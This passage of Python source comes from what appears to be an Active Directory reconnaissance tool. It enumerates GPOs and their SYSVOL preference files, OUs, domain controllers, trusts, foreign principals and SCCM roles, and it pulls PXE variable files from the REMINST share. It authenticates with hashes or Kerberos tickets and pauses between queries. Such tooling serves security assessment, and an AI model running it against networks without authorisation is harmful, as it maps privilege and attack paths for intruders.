			ldapsChannelBindingAlways = checkEPA(serverLDAPS, user_dn, nthash, kerberosAuth)
			if ldapsChannelBindingAlways == None:
				print(f"[-] Failed to verify Channel Binding (EPA) enforcement")
			else:
				if ldapsChannelBindingAlways == True:
					policyEPA = 'Always'
				else:
					if kerberosAuth:
						print("[-] Channel Binding (EPA) policy cannot be verified because EPA with Kerberos authentication over LDAPS not supported")
					else:
						ldapsChannelBindingWhenSupported = checkEPAPolicy(serverLDAPS, user_dn, nthash)
						if ldapsChannelBindingWhenSupported == None:
							print(f"[-] Failed to verify Channel Binding (EPA) policy")
						else:
							if ldapsChannelBindingWhenSupported == True:
								policyEPA = 'When supported'
							else:
								policyEPA = 'Never'
			if policyEPA != None:
				print(f'[+] LDAPS Channel Binding (EPA) policy = {policyEPA}')
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

########################################################################
#                     Group Policy Objects (GPOs)                      #
########################################################################

def parseGPPRegistry(xmlString, path):
	print(f"\t[+] GPP Registry '{path}'")
	root = ET.fromstring(xmlString)
	registries = root.findall(f".//Registry")
	for registry in registries:
		properties = list(registry) # Properties
		for property in properties:
			action = property.attrib['action']
			entry = property.attrib['hive'] + "\\" + property.attrib['key']
			key = property.attrib['name']
			value = property.attrib['value']
			print(f"\t\t[+] {action} {entry}/{key} {value}")

def parseGPPScheduledTasks(xmlString, path):
	print(f"\t[+] GPP Scheduled Tasks '{path}'")
	root = ET.fromstring(xmlString)
	tasks = root.findall(f".//Task")
	for task in tasks:
		properties = list(task) # Properties
		for property in properties:
			action = property.attrib['action']
			name = property.attrib['name']
			cmd = property.attrib['appName'] + " " + property.attrib['args']
			comment = property.attrib['comment'] if property.attrib['comment'] != '' else '<None>'
			options = {"enabled": property.attrib['enabled'], "deleteWhenDone": property.attrib['deleteWhenDone'], "startOnlyIfIdle": property.attrib['startOnlyIfIdle'],
					"stopOnIdleEnd": property.attrib['stopOnIdleEnd'], "noStartIfOnBatteries": property.attrib['noStartIfOnBatteries'],
					"stopIfGoingOnBatteries": property.attrib['stopIfGoingOnBatteries'], "systemRequired": property.attrib['systemRequired']}
			print(f"\t\t[+] {action} '{name}' = {cmd}")
			print(f"\t\t\t[+] Comment = {comment}")
			print(f"\t\t\t[+] Options = {options}")
			triggers = property.findall("Triggers") # Triggers
			for trigger in triggers:
				entries = list(trigger) # Trigger
				for entry in entries:
					fTrigger = entry.attrib
			print(f"\t\t\t[+] Triggers = {fTrigger}")

def parseGPPGroups(xmlString, path):
	print(f"\t[+] GPP Groups '{path}'")
	root = ET.fromstring(xmlString)
	groups = root.findall(f".//Group")
	for group in groups:
		properties = list(group) # Properties
		for property in properties:
			action = property.attrib['action']
			groupName = property.attrib['groupName']
			description = property.attrib['description'] if property.attrib['description'] != '' else '<None>'
			print(f"\t\t[+] {action} '{groupName}'")
			print(f"\t\t\t[+] Description = {description}")
			print(f"\t\t\t[+] Members")
			members = property.findall("Members") # Members
			for member in members:
				entries = list(member) # Member
				for entry in entries:
					print(f"\t\t\t\t[+] {entry.attrib['action']} {entry.attrib['name']}")

def displayGP(xmlString, path):
	print(f"\t[+] Printing raw GP '{path}'")
	print("\t\t-------------------------")
	try:
		prettyXML = xml.dom.minidom.parseString(xmlString).toprettyxml()
	except:
		prettyXML = xmlString
	lines = prettyXML.split("\n")
	for line in lines:
		print("\t\t" + line)
	print("\t\t-------------------------")

def listGPOs(connLDAP, server, ip, user, pwd, domain, nthash, aesKey, ccache, resolveMembers = False):
	print_yellow("[*] Listing GPOs")
	print_yellow("---")
	print()

	try:
		if connLDAP == '':
			print("[-] No LDAP connection available", file = sys.stderr)
			return

		entry_generator_gpo = search(connLDAP, server, filter = "(objectClass=groupPolicyContainer)", attributes = ["displayName", "cn", "description"])
		nbentries = 0
		gpos = []
		i = 0
		global PAGED_SIZE
		for entry in entry_generator_gpo:
			i += 1
			if (i % PAGED_SIZE == 0):
				maybeSleep()
			if entry["type"] == "searchResEntry":
				nbentries += 1

				displayName = entry["raw_attributes"]["displayName"][0].decode()
				guid = entry["raw_attributes"]["cn"][0].decode()
				description = entry["raw_attributes"]["description"]
				if description == []:
					description = "<None>"
				else:
					description = description[0].decode()

				gpo = {}
				gpo["displayName"] = displayName
				gpo["guid"] = guid
				gpo["description"] = description
				gpo["configuration"] = []

				j = 0
				entry_generator_gpo_to = search(connLDAP, server, filter = f"(gPLink=*{guid}*)", attributes = ["distinguishedName", "gPLink", "gPOptions", "objectClass"])
				for entry in entry_generator_gpo_to:
					j += 1
					if (j % PAGED_SIZE == 0):
						maybeSleep()
					if entry["type"] == "searchResEntry":
						dn = entry["raw_attributes"]["distinguishedName"][0].decode()
						if resolveMembers and not guid == "{31B2F340-016D-11D2-945F-00C04FB984F9}": # Default Domain Policy
							members = getMembers(connLDAP, server, [dn])
						else:
							members = {dn: []}
						configuration = {"members": members}
						status = int(entry["raw_attributes"]["gPLink"][0].decode().split(guid)[1].split(';')[1][0])
						if status == 0:
							configuration['enabled'] = True
							configuration['enforced'] = False
						elif status == 1:
							configuration['enabled'] = False
							configuration['enforced'] = False
						elif status == 2:
							configuration['enabled'] = True
							configuration['enforced'] = True
						else: # 3
							configuration['enabled'] = False
							configuration['enforced'] = True
						configuration["objectClass"] = entry["raw_attributes"]["objectClass"]
						configuration["inheritance"] = []
						if entry["raw_attributes"]["gPOptions"] != []:
							configuration["inheritance"] = int(entry["raw_attributes"]["gPOptions"][0].decode())
						gpo["configuration"] += [configuration]
				gpos += [gpo]

		originalSTDOUT = sys.stdout
		originalSTDERR = sys.stderr
		sys.stdout = StringIO()
		sys.stderr = StringIO()
		try:
			connSMB = SMBUtil.connect_smb(ip, user, pwd, domain, nthash, aesKey, ccache)
			if connSMB == '':
				sys.stdout = originalSTDOUT
				sys.stderr = originalSTDERR
				print("[-] No SMB connection available", file = sys.stderr)
				return
			
			paths, _ = SMBUtil.listFiles(connSMB, 'SYSVOL', '', [], [], [], None)
		except:
			sys.stdout = originalSTDOUT
			sys.stderr = originalSTDERR
			raise
		sys.stdout = originalSTDOUT
		sys.stderr = originalSTDERR

		for gpo in gpos:
			print("[+] Found GPO '{}'".format(gpo["displayName"]))
			print("\t[+] GUID = {}".format(gpo["guid"]))
			print("\t[+] Description = {}".format(gpo["description"]))
			print("\t[+] Configuration")
			for obj in gpo["configuration"]:
				print(f"\t\t[+] GPO Enable = {obj['enabled']}")
				print(f"\t\t[+] GPO Inheritance Enforced = {obj['enforced']}")
				print("\t\t[+] Targets")
				if isinstance(obj["inheritance"], int):
					if obj["inheritance"] == 1:
						print("\t\t\t[+] GPO will not apply to child objects of the following object (except if GPO Inheritance Enforced)")
				print_nested_dict(obj["members"], 3)
			targetDomainDN = server.info.other['defaultNamingContext'][0]
			targetDomain = ('.'.join([x.strip("DC=") for x in targetDomainDN.split(",")])).lower()
			groupsPath = f'{targetDomain}/Policies/{gpo["guid"]}/Machine/Preferences/Groups/Groups.xml'
			registriesPath = f'{targetDomain}/Policies/{gpo["guid"]}/Machine/Preferences/Registry/Registry.xml'
			scheduledTasksPath = f'{targetDomain}/Policies/{gpo["guid"]}/Machine/Preferences/ScheduledTasks/ScheduledTasks.xml'
			gptTmplPath = f'{targetDomain}/Policies/{gpo["guid"]}/Machine/Microsoft/Windows NT/SecEdit/GptTmpl.inf'
			for path in paths:
				try:
					if path.lower() == groupsPath.lower():
						content = SMBUtil.readFile(connSMB, 'SYSVOL', path, True)
						parseGPPGroups(content, path)
					elif path.lower() == registriesPath.lower():
						content = SMBUtil.readFile(connSMB, 'SYSVOL', path, True)
						parseGPPRegistry(content, path)
					elif path.lower() == scheduledTasksPath.lower():
						content = SMBUtil.readFile(connSMB, 'SYSVOL', path, True)
						parseGPPScheduledTasks(content, path)
					elif path.lower() == gptTmplPath.lower():
						content = SMBUtil.readFile(connSMB, 'SYSVOL', path, True)
						displayGP(content, path)
					else:
						pass
				except:
					try:
						displayGP(content, path)
					except:
						pass

		if nbentries == 0:
			print("[-] No GPOs found")
		
		return gpos
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

#######################################################################
#                     Organizational Units (OUs)                      #
#######################################################################

def listOUs(conn, server):
	print_yellow("[*] Listing OUs")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No LDAP connection available", file = sys.stderr)
			return

		entry_generator = search(conn, server, filter = "(objectClass=organizationalUnit)", attributes = ["distinguishedName", "description", "gPOptions"])
		nbentries = 0
		i = 0
		global PAGED_SIZE
		for entry in entry_generator:
			i += 1
			if (i % PAGED_SIZE == 0):
				maybeSleep()
			if entry["type"] == "searchResEntry":
				nbentries += 1

				dn = entry["raw_attributes"]["distinguishedName"][0].decode()
				inheritance = 0
				if entry["raw_attributes"]["gPOptions"] != []:
					inheritance = int(entry["raw_attributes"]["gPOptions"][0].decode())
				description = entry["raw_attributes"]["description"]
				if description == []:
					description = "<None>"
				else:
					description = description[0].decode()
				members = getMembers(conn, server, [dn])
				print(f"[+] OU's Description = {description}")
				if inheritance == 1:
					print("\t[+] Any GPOs linked to this OUs will not applied to it's child objects (except if GPO Inheritance Enforced)")
				print_nested_dict(members, 1)

		if nbentries == 0:
			print("[-] No OUs found")
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

#####################################################################
#                     Domain Controllers (DCs)                      #
#####################################################################

def listDCs(conn, server):
	print_yellow("[*] Listing DCs")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No LDAP connection available", file = sys.stderr)
			return

		dcs = []

		# List RW and RODC
		entry_generator = search(conn, server, filter = "(|(primaryGroupID=516)(primaryGroupID=521))", attributes = ["samAccountName", "primaryGroupID"])
		nbentries = 0
		i = 0
		global PAGED_SIZE
		for entry in entry_generator:
			i += 1
			if (i % PAGED_SIZE == 0):
				maybeSleep()
			if entry["type"] == "searchResEntry":
				nbentries += 1
				sam = entry["raw_attributes"]["samAccountName"][0].decode()
				primaryGroupID = int(entry["raw_attributes"]["primaryGroupID"][0].decode())
				if primaryGroupID == 516:
					dcs += [[sam, "Read-Write"]]
				else: # 521
					dcs += [[sam, "Read-Only"]]
		
		# Get PDC
		entry_generator = search(conn, server, filter = "(objectClass=domainDNS)", attributes = ["fSMORoleOwner"])
		for entry in entry_generator:
			if entry["type"] == "searchResEntry":
				fSMORoleOwner = entry["raw_attributes"]["fSMORoleOwner"][0].decode()
				for idx, dc in enumerate(dcs):
					if dc[0][:-1] in fSMORoleOwner: # samAccountName of DC into the Flexible Single Master Operation (FSMO) role for the domain
						dcs[idx] = dcs[idx] + ["PDC"]
						break

		if nbentries == 0:
			print("[-] No DCs found")
		else:
			for dc in dcs:
				if len(dc) == 2:
					print(f"[+] {dc[0]} ({dc[1]})")
				else:
					print(f"[+] {dc[0]} ({dc[1]}, {dc[2]})")
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

###############################################################
#                     Object Inheritance                      #
###############################################################

def getInheritance(conn, server, objects):
	print_yellow("[*] Checking ACLs/GPOs inheritance for provided objects")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No LDAP connection available", file = sys.stderr)
			return

		dns = getDNs(conn, server, objects)

		if len(dns) == 0:
			print("[-] Provided AD object(s) not found", file = sys.stderr)
			return

		for dn in dns:
			print(f"[+] Checking inheritance for '{dn}'")
			escaped_object = escape_filter_chars(dn)
			entry_generator = search(conn, server, escaped_object, f"(distinguishedName={escaped_object})", attributes = ["adminCount", "gPOptions", "objectClass"])
			i = 0
			global PAGED_SIZE
			for entry in entry_generator:
				i += 1
				if (i % PAGED_SIZE == 0):
					maybeSleep()
				if entry["type"] == "searchResEntry":
					objectClass = entry["raw_attributes"]["objectClass"]
					if b"domain" in objectClass or b"container" in objectClass or b"organizationalUnit" in objectClass:
						gpOptions = 0
						if entry["raw_attributes"]["gPOptions"] != []:
							gpOptions = int(entry["raw_attributes"]["gPOptions"][0].decode())
						if gpOptions == 0:
							print("\t[+] Any GPOs linked to this object will applied to it's child objects")
						else:
							print("\t[+] Any GPOs linked to this object will not applied to it's child objects (except if GPO Inheritance Enforced)")
					adminCount = 0
					if entry["raw_attributes"]["adminCount"] != []:
						adminCount = int(entry["raw_attributes"]["adminCount"][0].decode())
					if adminCount == 0:
						print("\t[+] Current object can inherit it's parent object ACLs (if configured to)")
					else:
						print("\t[+] Current object is protected and cannot inherit it's parent object ACLs")
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

##########################################################
#                     Domain Trusts                      #
##########################################################

# https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/5026a939-44ba-47b2-99cf-386a9e674b04
TRUST_DIRECTION_MAPS = {
	'0': 'Disabled',
	'1': 'Inbound',
	'2': 'Outbound',
	'3': 'Bidirectional'
}

# https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/36565693-b5e4-4f37-b0a8-c1b12138e18e
TRUST_TYPE_MAPS = {
	'1': 'Windows domain not running AD',
	'2': 'Windows domain running AD',
	'3': 'Non-Windows with Kerberos',
	'4': 'Not used',
	'5': 'Entra ID (Azure AD)'
}

# https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/e9a2d23c-c31e-4a6f-88a0-6646fdb51a3c
TRUST_ATTRIBUTES_MAPS = {
	'1': 'Trust is not transitive',
	'2': 'Only Windows 2000 and newer operating systems can use the trust',
	'4': 'Domain is quarantined and subject to SID filtering',
	'8': 'Cross forest trust between forests',
	'16': 'Domain or forest is not part of the organization',
	'32': 'Trusted domain is in the same forest',
	'64': 'Trust is treated as an external trust for SID filtering',
	'128': 'Set when trustType is TRUST_TYPE_MIT, which can use RC4 keys',
	'512': 'Tickets under this trust are not trusted for delegation',
	'1024': 'Cross-forest trust to a domain is treated as Privileged Identity Management (PIM) trust for the purposes of SID filtering',
	'2048': 'Tickets under this trust are trusted for delegation'
}

def listDomainTrusts(conn, server):
	print_yellow("[*] Listing Domain Trusts")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No LDAP connection available", file = sys.stderr)
			return

		entry_generator = search(conn, server, filter = "(objectClass=trustedDomain)", attributes = ["flatName", "trustPartner", "trustDirection", "trustType", "trustAttributes"])
		nbentries = 0
		i = 0
		global PAGED_SIZE
		for entry in entry_generator:
			i += 1
			if (i % PAGED_SIZE == 0):
				maybeSleep()
			if entry["type"] == "searchResEntry":
				nbentries += 1

				netBIOS = entry["raw_attributes"]["flatName"][0].decode()
				FQDN = entry["raw_attributes"]["trustPartner"][0].decode()
				try:
					trustDirection = TRUST_DIRECTION_MAPS[entry["raw_attributes"]["trustDirection"][0].decode()]
				except:
					trustDirection = "Failed to map key {}".format(entry["raw_attributes"]["trustDirection"][0].decode())
				try:
					trustType = TRUST_TYPE_MAPS[entry["raw_attributes"]["trustType"][0].decode()]
				except:
					trustType = "Failed to map key {}".format(entry["raw_attributes"]["trustType"][0].decode())
				try:
					trustAttributes = TRUST_ATTRIBUTES_MAPS[entry["raw_attributes"]["trustAttributes"][0].decode()]
				except:
					trustAttributes = "Failed to map key {}".format(entry["raw_attributes"]["trustAttributes"][0].decode())
				print(f"[+] Found trust for '{FQDN}' ({netBIOS})")
				print(f"\t[+] Trust direction = {trustDirection}\n\t[+] Trust type = {trustType}\n\t[+] Trust attributes = {trustAttributes}")

		if nbentries == 0:
			print("[-] No Domain Trusts found")
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

########################################################################
#                     Foreign Security Principals                      #
########################################################################

def listForeignPrincipals(conn, server, signing, ldaps, starttls, channelBinding, username, password, nthash, domain, aesKey, ccache, certFile, pfxPwd, pemPrivKeyFile, resolveSIDs, filterSIDs):
	print_yellow("[*] Listing Foreign Security Principals")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No LDAP connection available", file = sys.stderr)
			return

		global PAGED_SIZE

		trusts = []
		if resolveSIDs:
			entry_generator = search(conn, server, filter = "(objectClass=trustedDomain)", attributes = ["trustPartner", "trustDirection"])
			i = 0
			for entry in entry_generator:
				i += 1
				if (i % PAGED_SIZE == 0):
					maybeSleep()
				if entry["type"] == "searchResEntry":
					FQDN = entry["raw_attributes"]["trustPartner"][0].decode()
					trustDirection = entry["raw_attributes"]["trustDirection"][0].decode()
					if trustDirection == '3' or trustDirection == '1': # Bidirectional and inbound only for being able to connect to trusted domain
						trusts += [FQDN]

		entry_generator = search(conn, server, filter = "(objectClass=foreignSecurityPrincipal)", attributes = ["cn", "distinguishedName", "description"])
		nbentries = 0
		i = 0
		for entry in entry_generator:
			i += 1
			if (i % PAGED_SIZE == 0):
				maybeSleep()
			if entry["type"] == "searchResEntry":
				cn = entry["raw_attributes"]["cn"][0].decode()
				dn = entry["raw_attributes"]["distinguishedName"][0].decode()
				description = entry["raw_attributes"]["description"]
				if description == []:
					description = "<None>"
				else:
					description = description[0].decode()
				if not cn in ['S-1-5-9', 'S-1-5-17', 'S-1-5-11', 'S-1-5-4']: # Skip default Foreign Security Principals
					if (filterSIDs != None and cn in filterSIDs) or filterSIDs == None: # Check only provided SIDs or all SIDs
						nbentries += 1
						foreignDescription = "<Not found>"
						foreignDomain = "<Not found>"
						foreignDN = "<Not found>"
						if resolveSIDs:
							found = False
							for FQDN in trusts:
								print(f"[+] Connecting to LDAP server {FQDN}")
								kdcHost = FQDN
								foundKDCHost = True
								useKRB = False
								if ccache != None or aesKey != None: # Kerberos authentication
									useKRB = True
									# We need the PDC FQDN for the target domain to request a valid SPN
									# Find It by querying SRV record for '_ldap._tcp.pdc._msdcs.<FQDN>' through UDP and TCP
									try:
										kdcHost = str(dns.resolver.resolve(f"_ldap._tcp.pdc._msdcs.{FQDN}", "SRV", tcp = False)[0].target)[:-1]
									except:
										try:
											kdcHost = str(dns.resolver.resolve(f"_ldap._tcp.pdc._msdcs.{FQDN}", "SRV", tcp = True)[0].target)[:-1]
										except:
											print(f"[-] Failed to get domain controller FQDN for {FQDN}", file = sys.stderr)
											foundKDCHost = False
								
								if (useKRB and foundKDCHost) or (not useKRB):
									originalSTDOUT = sys.stdout
									sys.stdout = StringIO()
									connTarget, server = connect_ldap(kdcHost, signing, ldaps, starttls, channelBinding, username, password, nthash, domain, aesKey, ccache, certFile, pfxPwd, pemPrivKeyFile)
									sys.stdout = originalSTDOUT
									if connTarget != '':
										base_dn = ",".join(f"DC={component.lower()}" for component in FQDN.split("."))
										entry_generator_crossdomain = search(connTarget, server, baseDN = base_dn, filter = f"(objectSid={cn})", attributes = ["distinguishedName", "description"])
										j = 0
										for entry_crossdomain in entry_generator_crossdomain:
											j += 1
											if (j % PAGED_SIZE == 0):
												maybeSleep()
											if entry_crossdomain["type"] == "searchResEntry":
												found = True
												foreignDomain = FQDN
												foreignDN = entry_crossdomain["raw_attributes"]["distinguishedName"][0].decode()
												foreignDescription = entry_crossdomain["raw_attributes"]["description"]
												if foreignDescription == []:
													foreignDescription = "<None>"
												else:
													foreignDescription = foreignDescription[0].decode()
												break
									if found == True:
										break

						print(f"[+] Found '{dn}'")
						print(f"\t[+] Description = {description}")
						print(f"\t[+] Foreign Domain = {foreignDomain}")
						print(f"\t[+] Foreign Distinguished Name = {foreignDN}")
						print(f"\t[+] Foreign Description = {foreignDescription}")

		if nbentries == 0:
			print("[-] No Foreign Security Principals found")
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

#########################################################################################################################################
#                     System Center Configuration Manager (SCCM) / Microsoft Endpoint Configuration Manager (MECM)                      #
#########################################################################################################################################

def profileSCCM(target, username, password, domain, ntHash, aesKey, ccache):
	originalSTDOUT = sys.stdout
	originalSTDERR = sys.stderr
	sys.stdout = StringIO()
	sys.stderr = StringIO()
	connSMB = SMBUtil.connect_smb(target, username, password, domain, ntHash, aesKey, ccache)
	sys.stdout = originalSTDOUT
	sys.stderr = originalSTDERR

	if connSMB == '':
		print(f"\t[-] Failed to connect through SMB for '{target}'", file = sys.stderr)
		return None, None, None, None, None, None, None, None, None, None, None
	else:
		signing = True if connSMB.isSigningRequired() == 1 else False
		siteCode = None
		siteServ = False
		passive = True
		DP = False
		WSUS = False
		WDSPXE = False
		SCCMPXE = False
		siteDatabase = False
		mgmtPoint = False
		smsProvider = False

		# Analyze shares
		originalSTDOUT = sys.stdout
		originalSTDERR = sys.stderr
		sys.stdout = StringIO()
		sys.stderr = StringIO()
		sharesInfo = RPCUtil.listShares(target, username, password, domain, ntHash, aesKey, ccache)
		sys.stdout = originalSTDOUT
		sys.stderr = originalSTDERR

		shares = []
		if sharesInfo != None:
			sharesName = []
			sharesDesc = []
			for shareInfo in sharesInfo:
				sharesName += [shareInfo['shi1_netname'][:-1]]
				sharesDesc += [shareInfo['shi1_remark'][:-1] if shareInfo['shi1_remark'] != '\x00' else '<No Description>']
			
			shares = dict(zip(sharesName, sharesDesc))

			if "SMS_SITE" in shares:
				siteServ = True
				desc = shares.get('SMS_DP$', '')
				if 'ConfigMgr Site Server' in desc:
					passive = False
				else:
					# Default share SMS_DP$ is missing which may implies the use of high availability
					#	-> It may be a PASSIVE Site Server that retains same privileges (full control over System Management Container)
					passive = True
				sc = shares.get("SMS_SITE", '')
				if 'SMS Site' in sc:
					siteCode = (sc.split(" ")[2])
			if "SMS_DP$" in shares:
				desc = shares.get("SMS_DP$", '')
				if "SMS Site" in desc:
					DP = True
					siteCode = (desc.split(" ")[2])
				else:
					DP = False
			if "REMINST" in shares:
				# List REMINST contents to check if the SMSTemp dir actually exists and download PXE boot variables files (.var) if any
				desc = shares.get("REMINST", '')
				if "Windows Deployment Services Share" in desc:
					WDSPXE = True
				if "RemoteInstallation" in desc:
					SCCMPXE = True
				try:
					originalSTDOUT = sys.stdout
					originalSTDERR = sys.stderr
					capturedSTDERR = StringIO()
					sys.stdout = StringIO()
					sys.stderr = capturedSTDERR
					_, _ = SMBUtil.listShareRec(connSMB, "REMINST", "SMSTemp/*", [], [], 0, ['.var'], [], [], '.', [], True)
					err = capturedSTDERR.getvalue()
					sys.stdout = originalSTDOUT
					sys.stderr = originalSTDERR
					if "[-] Invalid directory" in err:
						pass
				except:
					sys.stdout = originalSTDOUT
					sys.stderr = originalSTDERR
					pass
			if "WsusContent" in shares:
				WSUS = True

		# Check if the target host is running MSSQL -> Site Database or random MSSQL   
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.settimeout(5)
		try:
			sock.connect((target, 1433))
			if sock:
				siteDatabase = True
		except:
			pass

		# Check if the target host is hosting the SMS_MP directory -> Management Point
		try:
			endpoint = f"http://{target}/ccm_system_windowsauth/"
			r = requests.request("GET", endpoint, verify = False)
			if r.status_code == 401:
				mgmtPoint = True
			else:
				endpoint = f"https://{target}/ccm_system_windowsauth/"
				r = requests.request("GET", endpoint, verify = False)
				if r.status_code == 401:
					mgmtPoint = True
		except:
			pass

		# Check if the target host is hosting the AdminService API -> SMS Provider 
		try:
			endpoint = f"http://{target}/AdminService/wmi/"
			r = requests.request("GET", endpoint, verify = False)
			if r.status_code == 401:
				smsProvider = True
			else:
				endpoint = f"https://{target}/AdminService/wmi/"
				r = requests.request("GET", endpoint, verify = False)
				if r.status_code == 401:
					smsProvider = True
		except:
			pass

		return signing, siteCode, siteServ, passive, DP, WSUS, WDSPXE, SCCMPXE, siteDatabase, mgmtPoint, smsProvider

def listSCCM(conn, server, domain, username, password, ntHash, aesKey, ccache):
	print_yellow("[*] Listing SCCM / MECM endpoints")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No LDAP connection available", file = sys.stderr)
			return

		global PAGED_SIZE

		# Find if the System Management container exist
		# It may exist or not because extension of AD schema (that allow site servers to publish to LDAP) is optional

		base_dn = f"CN=System Management,CN=System,{server.info.other['defaultNamingContext'][0]}"
		entry_generator = search(conn, server, baseDN = base_dn, filter = "(cn=System Management)")
		sysMgmtContainer = False
		i = 0
		for entry in entry_generator:
			i += 1
			if (i % PAGED_SIZE == 0):
				maybeSleep()
			if entry["type"] == "searchResEntry":
				sysMgmtContainer = True
		
		# Organize hierarchy by site code
		# 	{'<SiteCode1>': [[<Hostname1>, <Role1>, <Role2>, ...], [<Hostname2>, <Role1>, <Role2>, ...]], '<SiteCode2>': ...}
		# Unresolved objects goes into
		#	unresolvedComputers = [[<dNSHostName>, <Description>, <ObjClass/Role>], ...]
		#	unresolvedUsers = [[<distinguishedName>, <Description>, <ObjClass/Role>], ...]
		#	unresolvedGroups = [[<distinguishedName>, <Description>, <ObjClass/Role>], ...]
		# Store also Central Administration Site (CAS) sites codes into casSiteCodes

		siteCodes = {}
		unresolvedComputers = []
		unresolvedUsers = []
		unresolvedGroups = []
		casSiteCodes = []
		nbentries = 0

		if sysMgmtContainer: # System Management container exist

			# Find all Management Point (MP)
			entry_generator = search(conn, server, filter = "(objectclass=mSSMSManagementPoint)", attributes = ["dNSHostName", "mSSMSSitecode"])
			i = 0
			for entry in entry_generator:
				i += 1
				if (i % PAGED_SIZE == 0):
					maybeSleep()
				if entry["type"] == "searchResEntry":
					nbentries += 1

					dns = entry["raw_attributes"]["dNSHostName"][0].decode()
					siteCode = entry["raw_attributes"]["mSSMSSitecode"][0].decode()
					if siteCode not in siteCodes.keys():
						siteCodes[siteCode] = []
					siteCodes[siteCode] += [[dns, 'ManagementPoint']]

			# Find all sites codes
			entry_generator = search(conn, server, filter = "(objectclass=mSSMSSite)", attributes = ["msSMSSitecode"])
			i = 0
			for entry in entry_generator:
				i += 1
				if (i % PAGED_SIZE == 0):
					maybeSleep()
				if entry["type"] == "searchResEntry":
					nbentries += 1

					siteCode = entry["raw_attributes"]["msSMSSitecode"][0].decode()
					siteCodeExist = False
					for sc in siteCodes.keys():
						if siteCode == sc:
							siteCodeExist = True
							break
					if not siteCodeExist: # This is a Central Administration Site (CAS) site code
						casSiteCodes += [siteCode]
					else:
						pass

			# Find all PXE enabled Distribution Point (DP) that use Windows Deployment Services (WDS)
			entry_generator_dp = search(conn, server, filter = "(cn=*-Remote-Installation-Services)", attributes = ["distinguishedName"])
			i = 0
			for entry in entry_generator_dp:
				i += 1
				if (i % PAGED_SIZE == 0):
					maybeSleep()
				if entry["type"] == "searchResEntry":
					dn = entry["raw_attributes"]["distinguishedName"][0].decode()
					dn = dn[dn.find(',')+1:]
					escaped_object = escape_filter_chars(dn)
					entry_generator_computer = search(conn, server, filter = f"(distinguishedName={escaped_object})", attributes = ["dNSHostName", "description"])
					j = 0
					for entry in entry_generator_computer:
						j += 1
						if (j % PAGED_SIZE == 0):
							maybeSleep()
						if entry["type"] == "searchResEntry":
							nbentries += 1

							dns = entry["raw_attributes"]["dNSHostName"][0].decode()
							description =  entry["raw_attributes"]["description"]
							if description != []:
								description = description[0].decode()
							else:
								description = "<Empty>"
							dnsExist = False
							for sc in siteCodes.keys():
								for idx, val in enumerate(siteCodes[sc]):
									pDNS = val[0]
									if pDNS == dns:
										dnsExist = True
										siteCodes[sc][idx] += ['DistributionPoint']
										siteCodes[sc][idx] += ['WDSPXE']
										break
							if not dnsExist:
								unresolvedComputers += [[dns, description, 'DistributionPoint', 'WDSPXE']]

			# Find all site servers (ie full control over the System Management container)
			escaped_object = escape_filter_chars(base_dn)
			controls = security_descriptor_control(sdflags = SD_FLAGS_CONTROL.OWNER_SECURITY_INFORMATION + SD_FLAGS_CONTROL.GROUP_SECURITY_INFORMATION + SD_FLAGS_CONTROL.DACL_SECURITY_INFORMATION)
			entry_generator = search(conn, server, baseDN = f"CN=System Management,CN=System,{escaped_object}", filter = "(cn=System Management)", attributes = ["nTSecurityDescriptor"], controls = controls)
			i = 0
			for entry in entry_generator:
				i += 1
				if (i % PAGED_SIZE == 0):
					maybeSleep()
				if entry["type"] == "searchResEntry":
					SD = SECURITY_DESCRIPTOR.from_bytes(entry['raw_attributes']['nTSecurityDescriptor'][0])
					if (SD.Dacl.AceCount != 0):
						dacl = SD.Dacl.to_sddl()
						dacl = dacl[dacl.find("(")+1:-1]
						for ace in dacl.split(")("):
							ace_type, ace_flags, rights, object_guid, inherit_object_guid, account_sid = ace.split(";")
							type = SDDL_TO_ACE_TYPE_STR(ace_type)
							mask = SDDL_TO_ACE_ACCESS_RIGHTS_STR(rights)
							if ((type == "ACCESS_ALLOWED_OBJECT_ACE_TYPE" or type == "ACCESS_ALLOWED_ACE_TYPE") and mask == "GENERIC_ALL"): # This is a site server (or badly configured ACL)
								entry_generator_computer = search(conn, server, filter = f"(objectSid={account_sid})", attributes = ["objectClass", "description", "dNSHostName"])
								j = 0
								for entry in entry_generator_computer:
									j += 1
									if (j % PAGED_SIZE == 0):
										maybeSleep()
									if entry["type"] == "searchResEntry":
										objClass = entry["raw_attributes"]["objectClass"]
										if b'computer' in objClass:
											nbentries += 1

											dns = entry["raw_attributes"]["dNSHostName"][0].decode()
											description =  entry["raw_attributes"]["description"]
											if description != []:
